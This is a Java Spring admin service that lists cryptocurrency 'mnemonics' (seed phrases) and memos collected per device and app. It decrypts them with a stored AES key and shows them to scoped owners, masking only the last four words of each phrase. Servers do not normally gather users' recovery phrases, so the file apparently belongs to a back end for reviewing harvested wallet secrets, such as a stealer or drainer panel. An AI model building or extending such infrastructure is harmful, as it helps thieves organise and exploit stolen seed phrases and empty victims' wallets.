package com.admin.service;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.stream.Collectors;

import org.springframework.stereotype.Service;

import com.admin.auth.AdminContext;
import com.admin.config.V26AdminProperties;
import com.admin.dao.MemorandumDao;
import com.admin.dao.MnemonicDao;
import com.admin.entity.MemorandumEntity;
import com.admin.entity.MnemonicEntity;
import com.admin.util.MnemonicAesUtil;
import com.admin.util.TimeLabels;
import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;

import lombok.RequiredArgsConstructor;

@Service
@RequiredArgsConstructor
public class SecretListService {

    private final MnemonicDao mnemonicDao;
    private final MemorandumDao memorandumDao;
    private final ScopeService scopeService;
    private final V26AdminProperties props;

    public Map<String, Object> listMnemonics(AdminContext ctx, int page, int size, String deviceId, Long mnemonicId) {
        page = Math.max(page, 0);
        size = Math.min(Math.max(size, 1), 200);
        QueryWrapper<MnemonicEntity> qw = new QueryWrapper<>();
        if (mnemonicId != null && mnemonicId > 0) {
            qw.eq("id", mnemonicId);
        }
        if (deviceId != null && !deviceId.isBlank()) {
            qw.like("deviceId", deviceId.trim());
        }
        qw.orderByDesc("id");
        List<MnemonicEntity> rows = mnemonicDao.selectList(qw);
        List<Map<String, Object>> items = new ArrayList<>();
        Set<String> appIds = rows.stream()
                .map(m -> m.getAppId() == null ? "" : m.getAppId().trim().toLowerCase(Locale.ROOT))
                .filter(s -> !s.isEmpty())
                .collect(Collectors.toSet());
        Map<String, String> owners = scopeService.ownerLabelsByAppid(appIds);
        String aes = aesKey();
        for (MnemonicEntity row : rows) {
            if (!scopeService.rowVisible(ctx, row.getAppId(), row.getUserid())) {
                continue;
            }
            String aid = row.getAppId() == null ? "" : row.getAppId().trim().toLowerCase(Locale.ROOT);
            String plain = decryptQuiet(row.getResult(), aes);
            Map<String, Object> item = new LinkedHashMap<>();
            item.put("id", row.getId());
            item.put("deviceId", row.getDeviceId());
            item.put("appId", row.getAppId());
            item.put("userid", row.getUserid());
            item.put("source", row.getSource());
            item.put("resultMasked", maskMnemonic(plain));
            item.put("ownerLabel", owners.getOrDefault(aid, "—"));
            item.put("addtime", TimeLabels.isoZ(row.getAddtime()));
            item.put("addtimeLabel", TimeLabels.beijing(row.getAddtime()));
            items.add(item);
        }
        return pageOf(items, page, size);
    }

    public Map<String, Object> listMemorandums(AdminContext ctx, int page, int size, String deviceId) {
        page = Math.max(page, 0);
        size = Math.min(Math.max(size, 1), 200);
        QueryWrapper<MemorandumEntity> qw = new QueryWrapper<>();
        if (deviceId != null && !deviceId.isBlank()) {
            qw.like("deviceId", deviceId.trim());
        }
        qw.orderByDesc("id");
        List<MemorandumEntity> rows = memorandumDao.selectList(qw);
        List<Map<String, Object>> items = new ArrayList<>();
        Set<String> appIds = rows.stream()
                .map(m -> m.getAppId() == null ? "" : m.getAppId().trim().toLowerCase(Locale.ROOT))
                .filter(s -> !s.isEmpty())
                .collect(Collectors.toSet());
        Map<String, String> owners = scopeService.ownerLabelsByAppid(appIds);
        String aes = aesKey();
        for (MemorandumEntity row : rows) {
            if (!scopeService.rowVisible(ctx, row.getAppId(), row.getUserid())) {
                continue;
            }
            String aid = row.getAppId() == null ? "" : row.getAppId().trim().toLowerCase(Locale.ROOT);
            String plain = decryptQuiet(row.getResult(), aes);
            Map<String, Object> item = new LinkedHashMap<>();
            item.put("id", row.getId());
            item.put("deviceId", row.getDeviceId());
            item.put("appId", row.getAppId());
            item.put("userid", row.getUserid());
            item.put("resultMasked", maskMemo(plain));
            item.put("ownerLabel", owners.getOrDefault(aid, "—"));
            item.put("addtime", TimeLabels.isoZ(row.getAddtime()));
            item.put("addtimeLabel", TimeLabels.beijing(row.getAddtime()));
            items.add(item);
        }
        return pageOf(items, page, size);
    }

    private String aesKey() {
        return props.getMnemonicAesKey() == null ? "" : props.getMnemonicAesKey().trim();
    }

    private String decryptQuiet(String stored, String secret) {
        try {
            return MnemonicAesUtil.decrypt(stored, secret);
        } catch (Exception e) {
            return "";
        }
    }

    static String maskMnemonic(String phrase) {
        List<String> lines = new ArrayList<>();
        for (String raw : (phrase == null ? "" : phrase).split("\\r?\\n")) {
            String line = raw.trim();
            if (line.isEmpty()) {
                continue;
            }
            String[] words = line.split("\\s+");
            if (words.length <= 4) {
                lines.add("**** ".repeat(words.length).trim());
                continue;
            }
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < words.length; i++) {
                if (i > 0) {
                    sb.append(' ');
                }
                sb.append(i < words.length - 4 ? words[i] : "****");
            }
            lines.add(sb.toString());
        }
        return lines.isEmpty() ? "（无法解密）" : String.join("\n", lines);
    }

    static String maskMemo(String plain) {
        String text = plain == null ? "" : plain.trim();
        if (text.isEmpty()) {
            return "****";
        }
        if (text.length() <= 64) {
            return text;
        }
        return text.substring(0, 64).replaceAll("\\s+$", "") + " ****";
    }

    private Map<String, Object> pageOf(List<Map<String, Object>> items, int page, int size) {
        int total = items.size();
        int totalPages = total == 0 ? 0 : (int) Math.ceil(total / (double) size);
        if (total > 0 && page >= totalPages) {
            page = totalPages - 1;
        }
        int from = Math.min(page * size, total);
        int to = Math.min(from + size, total);
        Map<String, Object> data = new LinkedHashMap<>();
        data.put("items", items.subList(from, to));
        data.put("page", page);
        data.put("size", size);
        data.put("total", total);
        data.put("totalPages", totalPages);
        return data;
    }
}
